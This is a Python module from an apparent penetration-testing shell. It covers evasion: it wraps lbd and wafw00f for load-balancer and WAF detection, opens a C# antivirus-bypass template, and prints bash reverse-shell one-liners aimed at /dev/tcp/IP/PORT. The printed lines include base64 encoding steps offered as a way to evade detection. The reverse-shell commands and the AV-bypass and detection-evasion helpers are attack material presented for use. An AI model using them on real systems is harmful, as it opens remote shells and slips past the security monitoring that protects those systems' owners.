"""Evasion module — WAF detection, load balancer checks, AV bypass helpers."""

from __future__ import annotations

import os
import platform

import cmd2
from cmd2 import with_default_category

import utils.run_task as rt
import utils.string_format as sf
from utils.base_shell import BaseShell
from utils.check_var import check_vars

PLATFORM_SYSTEM = platform.system()


@with_default_category("Main commands")
class EvasionShell(BaseShell):
    def __init__(self):
        super().__init__("Evasion", "Evasion & WAF detection")
        self.url = ""
        self.domain = ""
        self.wordlist = ""
        self.add_settable(cmd2.Settable("url", str, "Target URL", self))
        self.add_settable(cmd2.Settable("wordlist", str, "Wordlist file path", self, completer=cmd2.Cmd.path_complete))
        self.add_settable(cmd2.Settable("domain", str, "Target domain", self))
        os.makedirs(self.resultsPath, exist_ok=True)
        self.do_help("-v")

    def do_lb_detector(self, arg):
        "Load Balancer Detector (lbd)"
        if check_vars([{"name": "domain", "value": self.domain}]):
            rt.runBackground(["lbd", self.domain])

    def do_waf_detector(self, arg):
        "WAF detection (wafw00f)"
        if check_vars([{"name": "url", "value": self.url}]):
            rt.runBackground(["wafw00f", self.url, "-o", self.resultsPath + "wafw00f.json"])

    def do_csharp_bypass(self, arg):
        "Open C# AV bypass template"
        self.do_edit("./Evasion/Windows_Exec_ByPass.cs")

    def do_reverse_shell_obfuscated(self, arg):
        "Generate obfuscated reverse shell command"
        print(sf.info("Obfuscated bash reverse shell:"))
        print("  bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'")
        print("  # Use base64 encoding to evade detection:")
        print('  echo "bash -i >& /dev/tcp/IP/PORT 0>&1" | base64')
        print("  # Then: echo <base64> | base64 -d | bash")


def main():
    EvasionShell().cmdloop()
